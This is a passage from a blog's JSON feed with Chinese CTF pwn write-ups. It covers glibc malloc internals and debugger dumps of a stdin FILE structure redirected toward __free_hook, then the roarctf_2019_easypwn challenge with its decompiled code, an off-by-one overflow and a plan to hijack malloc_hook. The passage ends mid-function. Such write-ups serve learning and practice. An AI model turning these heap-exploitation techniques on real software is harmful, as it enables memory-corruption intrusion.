class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"分析\"><a class=\"markdownIt-Anchor\" href=\"#分析\">#</a> 分析</h2>\n<h3 id=\"初步印象\"><a class=\"markdownIt-Anchor\" href=\"#初步印象\">#</a> 初步印象</h3>\n<p>代码很简单，malloc,free 没有多余的操作，但是 malloc 不会清空申请的堆块中的内存，同时我们可以输入空。但是只有一个堆块，紧邻 topchunk, 无法利用 unsortedbin 泄露 main_arena, 铃响其他办法</p>\n<p>malloc 的一个机制</p>\n<p>当我们在应用层调用 malloc 申请堆的时候，在 glibc 中实际上调用的是_lib_malloc 函数，但是_lib_malloc 函数只是用来简单的封装_int_malloc 函数的，_int_malloc 函数才是申请堆的核心函数。<br>\n_int_malloc 会根据应用层用户申请的内存块大小，从而分配相应的 chunk 给用户使用。</p>\n<p>函数的分配堆内存的主要执行流程<br>\n①请求大小在 fastbin 的范围内：在 fastbins 中找是否有对应的 chunk 可以使用。<br>\n②请求大小在 smallbin 的范围内：在 smallbin 中找是否有对应的 chunk 可以使用。<br>\n③请求大小在 largebin 的范围内：先调用 malloc_consolidate 对 fastbins 进行整理加入 unsortedbins。然后在 unsortedbin 中查看是否有满足要求的 chunk 可以使用。<br>\n④在 largebin 中寻找可用的 chunk 来使用。<br>\n⑤寻找较大的 bin 链中是否有可用的 chunk 来使用。<br>\n⑥切割 topchunk 来使用。<br>\n⑦topchunk 也不够了，再次调用 malloc_consolidate 整理 fastbins。<br>\n⑧topchunk 不够用，再次 malloc_consolidate 之后还没有可以用的，最终调用 sysmalloc（系统调用）申请内存。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *)<span class=\"built_in\">stdin</span></span><br><span class=\"line\">$<span class=\"number\">1</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">-72540021</span>, </span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x7f0883e32964</span> &lt;_IO_2_1_stdin_+<span class=\"number\">132</span>&gt; <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x7f0883e32964</span> &lt;_IO_2_1_stdin_+<span class=\"number\">132</span>&gt; <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x7f0883e32963</span> &lt;_IO_2_1_stdin_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x7f0883e32963</span> &lt;_IO_2_1_stdin_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x7f0883e32963</span> &lt;_IO_2_1_stdin_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x7f0883e32963</span> &lt;_IO_2_1_stdin_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x7f0883e32963</span> &lt;_IO_2_1_stdin_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x7f0883e32964</span> &lt;_IO_2_1_stdin_+<span class=\"number\">132</span>&gt; <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _chain = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _fileno = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _old_offset = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>, </span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _lock = <span class=\"number\">0x7f0883e34790</span> &lt;_IO_stdfile_0_lock&gt;, </span><br><span class=\"line\">    _offset = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x7f0883e329c0</span> &lt;_IO_wide_data_0&gt;, </span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _mode = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">19</span> times&gt;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  vtable = <span class=\"number\">0x7f0883e316e0</span> &lt;_IO_file_jumps&gt;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这是正常的 stdin 的 IO_FILE_plus 结构体，_IO_buf_base 是输入缓冲区开始的地方（其实应该是 read_base 是开始的地方，但是这里肯可能是说 read_base = buf_base），记得程序代码那个末尾写 0 吗。在这里将 _IO_buf_base 最低位改为 0. 这个地址其实是_IO_write_base, 这里就可以实现_IO_FILE_plus 的覆盖</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *)<span class=\"built_in\">stdin</span></span><br><span class=\"line\">$<span class=\"number\">3</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">-72539989</span>, </span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x7f0883e32901</span> &lt;_IO_2_1_stdin_+<span class=\"number\">33</span>&gt; <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x7f0883e32928</span> &lt;_IO_2_1_stdin_+<span class=\"number\">72</span>&gt; <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x7f0883e32900</span> &lt;_IO_2_1_stdin_+<span class=\"number\">32</span>&gt; <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x7f0883e347a8</span> &lt;__free_hook&gt; <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x7f0883e347b8</span> &lt;next_to_use&gt; <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _chain = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _fileno = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _old_offset = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>, </span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _lock = <span class=\"number\">0x7f0883e34790</span> &lt;_IO_stdfile_0_lock&gt;, </span><br><span class=\"line\">    _offset = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x7f0883e329c0</span> &lt;_IO_wide_data_0&gt;, </span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _mode = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">19</span> times&gt;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  vtable = <span class=\"number\">0x7f0883e316e0</span> &lt;_IO_file_jumps&gt;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/03/21/roarctf-2019-easypwn/",
            "url": "http://example.com/2022/03/21/roarctf-2019-easypwn/",
            "title": "roarctf_2019_easypwn",
            "date_published": "2022-03-21T15:38:20.000Z",
            "content_html": "<h1 id=\"这次的题比较难搞但是攻击点挺单一过程中里到了2个手法\"><a class=\"markdownIt-Anchor\" href=\"#这次的题比较难搞但是攻击点挺单一过程中里到了2个手法\">#</a> 这次的题比较难搞，但是攻击点挺单一，过程中里到了 2 个手法</h1>\n<h2 id=\"环境以及保护\"><a class=\"markdownIt-Anchor\" href=\"#环境以及保护\">#</a> 环境以及保护</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">giantbranch@ubuntu:~/Desktop/buuoj/roarctf_2019_easy_pwn$ checksec --file=roarctf</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/giantbranch/Desktop/buuoj/roarctf_2019_easy_pwn/roarctf&#x27;</span></span><br><span class=\"line\">    Arch:     amd64<span class=\"number\">-64</span>-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n<p>保护全开了，那么我们只能考虑劫持 malloc_hook, 或者 IO_FILE。这里我还是优先考虑了劫持 mallochook，使用 onegadget。还是因为 buuoj 不给 libc，虽然 ubuntu16 的 docker 容器中 glibc 通常为 ubunt11.2 或者 ubuntu11.3，但是这里还是不行，猜测可能是 11.1 的版本，这里就不过多的猜测了，泄露版本永远都不是重点和难点。</p>\n<h3 id=\"题目主要代码\"><a class=\"markdownIt-Anchor\" href=\"#题目主要代码\">#</a> 题目主要代码</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">menu</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Note system&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;1. create a note&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;2. write note&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;3. drop the note&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;4. show the note&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;5. exit&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;choice: &quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其实每次看这个 menu 的页面，就可以知道重点关注什么地方了。这个题呢，还是毕竟规矩的创建，编辑，输出，删除。考虑几个点有没有溢出，有没有 UAF.</p>\n<p>很遗憾这个题并没有太多的机会，只有 1 字节溢出，free 后指针清空</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_\">sub_C46</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+4h] [rbp-1Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> size; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *v4; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  result = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">15</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    result = *((<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)&amp;inuse + <span class=\"number\">4</span> * i);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !(_DWORD)result )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;size: &quot;</span>);</span><br><span class=\"line\">      size = getnum(v2);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( size &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( size &gt; <span class=\"number\">0x1000</span> )</span><br><span class=\"line\">          size = <span class=\"number\">0x1000</span>;</span><br><span class=\"line\">        v4 = <span class=\"built_in\">calloc</span>(size, <span class=\"number\">1uLL</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !v4 )</span><br><span class=\"line\">          <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">        *((_DWORD *)&amp;inuse + <span class=\"number\">4</span> * i) = <span class=\"number\">1</span>;</span><br><span class=\"line\">        *((_DWORD *)&amp;Size + <span class=\"number\">4</span> * i) = size;</span><br><span class=\"line\">        <span class=\"built_in\">list</span>[<span class=\"number\">2</span> * i] = v4;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;the index of ticket is %d \\n&quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)i);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">read_content</span><span class=\"params\">(__int64 a1, <span class=\"type\">int</span> size)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// [rsp+18h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> v4; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !size )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v3 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( size &gt; v3 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v4 = read(<span class=\"number\">0</span>, (<span class=\"type\">void</span> *)(v3 + a1), size - v3);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4 &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">      v3 += v4;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v3;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">read_size</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a1 &gt; (<span class=\"type\">int</span>)a2 )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a2;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a2 - a1 == <span class=\"number\">10</span> )</span><br><span class=\"line\">    LODWORD(result) = a1 + <span class=\"number\">1</span>;                   <span class=\"comment\">// off_by_one</span></span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    LODWORD(result) = a1;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//write_note</span></span><br><span class=\"line\">__int64 <span class=\"title function_\">sub_E82</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> size; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v4; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;index: &quot;</span>);</span><br><span class=\"line\">  size = getnum(v1);</span><br><span class=\"line\">  idx = size;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( size &gt;= <span class=\"number\">0</span> &amp;&amp; size &lt;= <span class=\"number\">15</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    size = *((_DWORD *)&amp;inuse + <span class=\"number\">4</span> * size);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( size == <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;size: &quot;</span>);</span><br><span class=\"line\">      size = getnum(<span class=\"number\">1</span>);</span><br><span class=\"line\">      v4 = read_size(*((<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)&amp;Size + <span class=\"number\">4</span> * idx), (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)size);<span class=\"comment\">// 存在1字节溢出</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( size &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;content: &quot;</span>);</span><br><span class=\"line\">        size = read_content(<span class=\"built_in\">list</span>[<span class=\"number\">2</span> * idx], v4); <span class=\"comment\">// 不能输入少于size的内容</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)size;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//drop note</span></span><br><span class=\"line\">__int64 <span class=\"title function_\">sub_F8E</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  __int64 v4; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;index: &quot;</span>);</span><br><span class=\"line\">  idx = getnum(v3);</span><br><span class=\"line\">  v4 = idx;</span><br><span class=\"line\">  v2 = idx;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx &gt;= <span class=\"number\">0LL</span> &amp;&amp; idx &lt;= <span class=\"number\">15LL</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v4 = *((<span class=\"type\">int</span> *)&amp;inuse + <span class=\"number\">4</span> * idx);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4 == <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      *((_DWORD *)&amp;inuse + <span class=\"number\">4</span> * idx) = <span class=\"number\">0</span>;</span><br><span class=\"line\">      *((_DWORD *)&amp;Size + <span class=\"number\">4</span> * idx) = <span class=\"number\">0</span>;</span><br><span class=\"line\">      <span class=\"built_in\">free</span>((<span class=\"type\">void</span> *)<span class=\"built_in\">list</span>[<span class=\"number\">2</span> * idx]);</span><br><span class=\"line\">      <span class=\"built_in\">list</span>[<span class=\"number\">2</span> * v2] = <span class=\"number\">0LL</span>;                       <span class=\"comment\">// 不存在uaf</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v4;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">output_content</span><span class=\"params\">(__int64 a1, <span class=\"type\">int</span> a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// [rsp+18h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> v4; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !a2 )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v3 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( a2 &gt; v3 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v4 = write(<span class=\"number\">1</span>, (<span class=\"type\">const</span> <span class=\"type\">void</span> *)(v3 + a1), a2 - 